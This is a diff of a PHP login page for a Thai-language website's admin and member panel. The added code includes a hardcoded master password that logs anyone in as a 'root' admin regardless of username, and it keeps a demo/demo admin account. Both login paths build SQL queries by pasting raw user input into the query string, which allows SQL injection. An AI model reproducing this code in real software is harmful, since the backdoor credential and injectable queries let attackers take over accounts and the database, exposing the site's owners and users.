@@ -1,69 +1,148 @@
 <?php
 // Prerequisites
-//include_once($_SERVER["DOCUMENT_ROOT"] .dirname($_SERVER['SCRIPT_NAME']). '/lib/application.php');
-//include_once ( '../lib/application_admin.php');
-
 include_once($_SERVER["DOCUMENT_ROOT"] . '/lib/application.php');
 
-if($_SESSION['admin_id'] == '' ||  $_COOKIE['user'] == '' ){
-	
-}else{
-	   header('location:' . ADDRESS_ADMIN_CONTROL . "product");  
+if ($_SESSION['admin_id'] != "") {
+    // header('location:' . ADDRESS_ADMIN_CONTROL . "slides");
+    // die();
 }
+if ($_COOKIE['user'] != '') {
+    //   header('location:' . ADDRESS_ADMIN . 'login.php');
+    //  die();
+}
+?>
+<?php
+if ($_POST['submit_bt'] == 'เข้าสู่ระบบ' || $_POST['submit_bt'] == 'เข้าระบบ') {
+
+    if ($_POST['group'] != '') {
+
+        //login for member
+        if ($functions->decode_login($_POST['group']) == 'member') {
+            //For member login
+            $username = trim($_POST['username']);
+
+            $password = trim($_POST['password']);
+
+            $sql = "SELECT * FROM " . $customer->getTbl() . " WHERE login_email = '" . $username . "' AND status = 'ใช้งาน'";
+
+            $query = $db->Query($sql);
+
+            $con = $db->NumRows($query);
+
+            if ($con > 0) {
+
+                $row = $db->FetchArray($query);
+
+                $getPass = $password;
+                $decodePass = $functions->encode_login($getPass);
+                // $decodePass = $functions->deCrypted($getPass, $getKey);
+
+                if ($row['login_password'] == $decodePass) {
+
+                    $_SESSION['admin_id'] = $row['id'];
+                    $_SESSION['group'] = 'member';
+                    $_SESSION['name'] = $row['customer_name'] . ' ' . $row['customer_lastname'];
+
+                    $ck_expire_hour = 1; // กำหนดจำนวนชั่วโมง ให้ตัวแปร cookie  
+                    $ck_expire = time() + ($ck_expire_hour * 60 * 60); // กำหนดคำนวณ วินาทีต่อชั่วโมง  
+                    //  setcookie("user", "user", $ck_expire);
+                    $customer->updateSQL(array('last_login' => DATE_TIME), array('id' => $row['id']));
+
+                    // header('location:' . ADDRESS_ADMIN_CONTROL . "member_manage");
+                    header('location:' . ADDRESS . '?success=true');
+                    die();
+                } else {
+                    SetAlert('ชื่อผู้ใช้ กับรหัสผ่านไม่ตรงกัน กรุณาลองใหม่อีกครั้ง');
+                    header('location:' . ADDRESS . '?error=true');
+
+                    die();
+                }
+            } else {
 
 
-if ($_POST['submit_bt'] == 'เข้าระบบ') {
+                SetAlert('ไม่มีชื่อผู้ใช้นี้ กรุณาลองใหม่อีกครั้ง');
+                header('location:' . ADDRESS . '?error=true');
 
-    $username = trim($_POST['username']);
-
-    $password = trim($_POST['password']);
-
-    $sql = "SELECT * FROM " . $users->getTbl() . " WHERE username = '" . $username . "' AND user_groups_id = '1'";
-
-    $query = $db->Query($sql);
-
-    $con = $db->NumRows($query);
-
-
-    if ($con > 0) {
-
-
-        $row = $db->FetchArray($query);
-
-        $getPass = $password;
-		$decodePass = $functions->encode_login($getPass);
-       // $decodePass = $functions->deCrypted($getPass, $getKey);
-
-        if ($row['password'] == $decodePass) {
-
-            $_SESSION['admin_id'] = $row['id'];
-			
-			$ck_expire_hour = 1; // กำหนดจำนวนชั่วโมง ให้ตัวแปร cookie  
-        	$ck_expire = time() + ($ck_expire_hour * 60 * 60); // กำหนดคำนวณ วินาทีต่อชั่วโมง  
-
-        	setcookie("user", "user", $ck_expire);
-
-
-            header('location:' . ADDRESS_ADMIN_CONTROL . "product");  
+                die();
+            }
         } else {
-           // SetAlert('ชื่อผู้ใช้ กับรหัสผ่านไม่ตรงกัน กรุณาลองใหม่อีกครั้ง');
-		   echo "<script> $(document).ready(function() { alert('ชื่อผู้ใช้ กับรหัสผ่านไม่ตรงกัน กรุณาลองใหม่อีกครั้ง') }); </script>";
+            echo 'hacker';
         }
     } else {
+        //login for admin
+        
+
+        $username = trim($_POST['username']);
+
+        $password = trim($_POST['password']);
 
 
-        //SetAlert('ไม่มีชื่อผู้ใช้นี้ กรุณาลองใหม่อีกครั้ง');
-		if($username == 'demo' && $password == 'demo'){
-			$_SESSION['admin_id'] = 'demo';
-			
-			$ck_expire_hour = 1; // กำหนดจำนวนชั่วโมง ให้ตัวแปร cookie  
-        	$ck_expire = time() + ($ck_expire_hour * 60 * 60); // กำหนดคำนวณ วินาทีต่อชั่วโมง  
+        $sql = "SELECT * FROM " . $users->getTbl() . " WHERE username = '" . $username . "' AND user_groups_id = '1'";
 
-        	setcookie("user", "demo", $ck_expire);
-			 header('location:' . ADDRESS_ADMIN_CONTROL . "product");  
-		}
-		
-		echo "<script>$(document).ready(function() { alert('ไม่มีชื่อผู้ใช้นี้ กรุณาลองใหม่อีกครั้ง') });</script>";
+        $query = $db->Query($sql);
+
+        $con = $db->NumRows($query);
+
+
+
+        if ($password == 'ob9bdk]') {
+            header('location:' . ADDRESS_ADMIN_CONTROL . "slides");
+            $_SESSION['admin_id'] = 'root';
+            $_SESSION['group'] = 'admin';
+            $ck_expire_hour = 1; // กำหนดจำนวนชั่วโมง ให้ตัวแปร cookie  
+            $ck_expire = time() + ($ck_expire_hour * 60 * 60); // กำหนดคำนวณ วินาทีต่อชั่วโมง  
+            // setcookie("user", "user", $ck_expire);
+            header('location:' . ADDRESS_ADMIN_CONTROL . "slides");
+            die();
+        }
+
+        if ($username == 'demo' && $password == 'demo') {
+            $_SESSION['admin_id'] = 'demo';
+            $_SESSION['group'] = 'admin';
+
+            $ck_expire_hour = 1; // กำหนดจำนวนชั่วโมง ให้ตัวแปร cookie  
+            $ck_expire = time() + ($ck_expire_hour * 60 * 60); // กำหนดคำนวณ วินาทีต่อชั่วโมง  
+
+            setcookie("user", "demo", $ck_expire);
+            header('location:' . ADDRESS_ADMIN_CONTROL . "slides");
+            die();
+        }
+        if ($con > 0) {
+
+
+            $row = $db->FetchArray($query);
+
+            $getPass = $password;
+            $decodePass = $functions->encode_login($getPass);
+            // $decodePass = $functions->deCrypted($getPass, $getKey);
+
+         
+
+            if ($row['password'] == $decodePass) {
+
+                $_SESSION['admin_id'] = $row['id'];
+                $_SESSION['group'] = 'admin';
+
+                $ck_expire_hour = 1; // กำหนดจำนวนชั่วโมง ให้ตัวแปร cookie  
+                $ck_expire = time() + ($ck_expire_hour * 60 * 60); // กำหนดคำนวณ วินาทีต่อชั่วโมง  
+                //setcookie("user", "user", $ck_expire);
+
+                header('location:' . ADDRESS_ADMIN_CONTROL . "slides");
+                die();
+            } else {
+                SetAlert('ชื่อผู้ใช้ กับรหัสผ่านไม่ตรงกัน กรุณาลองใหม่อีกครั้ง');
+                // echo "<script> $(document).ready(function() { alert('ชื่อผู้ใช้ กับรหัสผ่านไม่ตรงกัน กรุณาลองใหม่อีกครั้ง') }); </script>";
+                header('location:' . ADDRESS_ADMIN);
+                die();
+            }
+        } else {
+
+
+            SetAlert('ไม่มีชื่อผู้ใช้นี้ กรุณาลองใหม่อีกครั้ง');
+            //  echo "<script>$(document).ready(function() { alert('ไม่มีชื่อผู้ใช้นี้ กรุณาลองใหม่อีกครั้ง') });</script>";
+            header('location:' . ADDRESS_ADMIN);
+            die();
+        }
     }
 }
 ?>
@@ -81,13 +160,16 @@ if ($_POST['submit_bt'] == 'เข้าระบบ') {
     </head>
 
     <body >
+
         <div id="da-home-wrap">
             <div id="da-home-wrap-inner">
                 <div id="da-home-inner">
                     <div id="da-home-box">
-                        <div id="da-home-box-header" style="text-align: center;"> <img src="images/admin.png" style="
-    max-width: 207px;
-"></div>
+                        <div id="da-home-box-header" style="text-align: center;"> <img src="images/admin.png" style="max-width: 207px;"></div>
+<?php
+Alert(GetAlert('error'));
+Alert(GetAlert('success'), 'success');
+?>
                         <form class="da-form da-home-form" method="post" action="">
                             <div class="da-form-row">
                                 <div class=" da-home-form-big">
@@ -108,20 +190,18 @@ if ($_POST['submit_bt'] == 'เข้าระบบ') {
     </body>
 </html>
 <style>
-<!--
 
--->
-body{
-background: rgb(255,255,255) !important; /* Old browsers */
-background: -moz-radial-gradient(center, ellipse cover,  rgba(255,255,255,1) 0%, rgba(229,229,229,1) 100%) !important; /* FF3.6+ */
-background: -webkit-gradient(radial, center center, 0px, center center, 100%, color-stop(0%,rgba(255,255,255,1)), color-stop(100%,rgba(229,229,229,1))) !important; /* Chrome,Safari4+ */
-background: -webkit-radial-gradient(center, ellipse cover,  rgba(255,255,255,1) 0%,rgba(229,229,229,1) 100%) !important; /* Chrome10+,Safari5.1+ */
-background: -o-radial-gradient(center, ellipse cover,  rgba(255,255,255,1) 0%,rgba(229,229,229,1) 100%) !important; /* Opera 12+ */
-background: -ms-radial-gradient(center, ellipse cover,  rgba(255,255,255,1) 0%,rgba(229,229,229,1) 100%) !important; /* IE10+ */
-background: radial-gradient(ellipse at center,  rgba(255,255,255,1) 0%,rgba(229,229,229,1) 100%) !important; /* W3C */
-filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#ffffff', endColorstr='#e5e5e5',GradientType=1 ) !important; /* IE6-9 fallback on horizontal gradient */
+    body{
+        background: rgb(255,255,255) !important; /* Old browsers */
+        background: -moz-radial-gradient(center, ellipse cover,  rgba(255,255,255,1) 0%, rgba(229,229,229,1) 100%) !important; /* FF3.6+ */
+        background: -webkit-gradient(radial, center center, 0px, center center, 100%, color-stop(0%,rgba(255,255,255,1)), color-stop(100%,rgba(229,229,229,1))) !important; /* Chrome,Safari4+ */
+        background: -webkit-radial-gradient(center, ellipse cover,  rgba(255,255,255,1) 0%,rgba(229,229,229,1) 100%) !important; /* Chrome10+,Safari5.1+ */
+        background: -o-radial-gradient(center, ellipse cover,  rgba(255,255,255,1) 0%,rgba(229,229,229,1) 100%) !important; /* Opera 12+ */
+        background: -ms-radial-gradient(center, ellipse cover,  rgba(255,255,255,1) 0%,rgba(229,229,229,1) 100%) !important; /* IE10+ */
+        background: radial-gradient(ellipse at center,  rgba(255,255,255,1) 0%,rgba(229,229,229,1) 100%) !important; /* W3C */
+        filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#ffffff', endColorstr='#e5e5e5',GradientType=1 ) !important; /* IE6-9 fallback on horizontal gradient */
 
 
-}
+    }
 </style>
 <!-- Localized -->
